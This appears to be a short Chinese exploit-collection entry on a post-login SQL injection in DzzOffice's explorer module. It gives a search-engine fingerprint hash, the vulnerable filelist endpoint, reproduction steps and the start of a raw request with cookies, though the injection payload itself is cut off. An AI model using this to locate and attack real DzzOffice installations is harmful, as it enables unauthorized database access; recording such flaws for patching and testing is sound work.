# DzzOffice办公软件explorer存在后台SQL注入漏洞

- **系统**：DzzOffice　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="-1961736892"`
- **请求**：`POST /index.php?mod=explorer&op=dynamic&do=filelist HTTP/1.1`

**请求体 / payload**
```
* 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
1. 先注册用户登录系统获取cookie
2. 使用上一步获取的cookie进行测试
Host:
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: akJE_2132_saltkey=HZqrxEwb; akJE_2132_lastvisit=1713857672; akJE_2132_sid=q4j3kC; akJE_2132_lastact=1713861417%09misc.php%09sendwx; akJE_2132_sendmail=1; akJE_2132_seccodeSq4j3kC0=7bffgd26MmkE4-rOPQ9VfbprQFV…（脚本共 1755 字，完整版见原文）
```

**其他**
- 版本: * DzzOffice 办公软件